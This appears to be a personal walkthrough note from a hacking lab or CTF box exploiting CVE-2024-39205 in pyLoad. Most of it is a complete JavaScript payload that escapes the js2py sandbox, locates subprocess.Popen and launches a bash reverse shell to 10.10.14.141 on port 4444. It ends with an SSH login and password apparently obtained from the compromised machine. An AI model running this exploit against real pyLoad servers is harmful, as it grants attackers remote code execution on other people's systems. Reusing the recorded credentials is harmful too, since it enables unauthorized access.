![[IMG-20250817194237447.png]]

[CVE  2024-39205](https://github.com/Marven11/CVE-2024-39205-Pyload-RCE/tree/main?tab=readme-ov-file)
Payload:

```js
// [+] command goes here:
let ip = "10.10.14.141";
let port = 4444;
let cmd = "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}
```

![[IMG-20250819013050399.png]]

![[IMG-20250819012840908.png]]

![[IMG-20250819013501470.png]]

### ssh
login: marco
password: sweetangelbabylove

![[IMG-20250819013642504.png]]


